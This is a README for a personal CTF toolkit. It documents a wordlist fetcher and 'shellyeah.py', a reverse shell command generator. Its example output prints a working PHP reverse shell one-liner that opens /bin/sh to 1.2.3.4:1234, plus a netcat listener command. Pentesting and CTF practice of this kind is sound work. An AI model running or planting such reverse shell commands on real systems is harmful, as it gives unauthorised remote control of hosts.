# ctf_tools
CTF tools crafted for my personal needs.

## wl_fetcher.sh
`wl_fetcher.sh` or WL-fetcher (wordlist fetcher), which is a single tool to fetch wordlists from multiple sources into the provided directory.

List of fetched worlists are hard coded. Modify the list to fit your needs. Perhaps this tool will be modified later to support list of repositories as a parameter.

### Usage
```sh
$ mkdir wordlists/
$ chmod +x wl_fetcher.sh
$ ./wl_fetcher.sh -d wordlists/  # Fetches the wordlists
$ ./wl_fetcher.sh -u wordlists/  # Fetches changes for the wordlists
```

#### Example
```sh
$ ./wl_fetcher.sh -h
__          ___          ______   _       _               
\ \        / / |        |  ____| | |     | |              
 \ \  /\  / /| |  ______| |__ ___| |_ ___| |__   ___ _ __ 
  \ \/  \/ / | | |______|  __/ _ \ __/ __| '_ \ / _ \ '__|
   \  /\  /  | |____    | | |  __/ || (__| | | |  __/ |   
    \/  \/   |______|   |_|  \___|\__\___|_| |_|\___|_|   

Usage: ./wl_fetcher.sh [OPTION] [DIRECTORY]
Fetches wordlists into the provided directory.

Options:
-h, --help             Display this help message
-d, --directory        Specify the directory to fetch wordlists into
-l, --list             Lists repos from which wordlists are fetched
-u, --update           Fetches updates for wordlists (if available)
```

## shellyeah.py
`shellyeah.py` is a CLI tool for generating reverse shell commands.
### Usage:
```sh
$ python3 shellyeah.py -a 127.0.0.1 -p 1234 -s "php exec"
$ python3 shellyeah.py  # List parameters and available shell commands
```

If you want to simplify things:
```sh
$ sudo ln -s [<Path to shellyeah.py>]/shellyeah.py /usr/local/bin/shellyeah
$ chmod +x shellyeah
$ shellyeah -h
 _______________________________________
< Shell Yeah! - Reverse Shell Generator >
 ---------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

usage: rev_shell_gen.py [-h] -a ADDRESS -p PORT -s {busybox nc,bash -i,php cmd,php exec,powershell}
rev_shell_gen.py: error: the following arguments are required: -a/--address, -p/--port, -s/--shell
```

#### Examples
```sh
$ python3 shellyeah.py -a 1.2.3.4 -p 1234 -s "php exec"

 _______________________________________
< Shell Yeah! - Reverse Shell Generator >
 ---------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

Listener command:
nc -lvnp 1234

Reverse shell command:
php -r '$sock=fsockopen("1.2.3.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
